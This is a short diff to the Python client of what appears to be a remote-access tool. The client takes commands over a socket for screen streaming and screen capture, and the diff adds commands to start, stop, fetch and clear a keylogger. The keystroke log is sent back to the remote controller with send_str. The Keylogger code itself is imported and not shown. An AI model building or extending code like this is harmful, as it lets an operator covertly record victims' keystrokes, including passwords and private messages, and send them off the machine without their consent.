@@ -1,5 +1,6 @@
 from services.Socket import Socket
 import services.utils as utils
+import services.keyboard as keyboard
 import socket
 import threading
 import queue
@@ -131,7 +132,16 @@ class Client(Socket, threading.Thread):
                 self.task_screen_stream()
             elif flag == 'screen-capture':
                 self.task_screen_capture()
+            elif flag == 'listener-hook':
+                self.listener = keyboard.Keylogger()
+                self.listener.start()
+            elif flag == 'listener-unhook':
+                self.listener.stop()
+            elif flag == 'listener-get':
+                self.send_str(self.listener.get_log())
+            elif flag == 'listener-clear':
+                self.listener.clear_log()
 
-    
+
 def DEBUG(*args,**kwargs):
     print("Server:", *args,**kwargs)
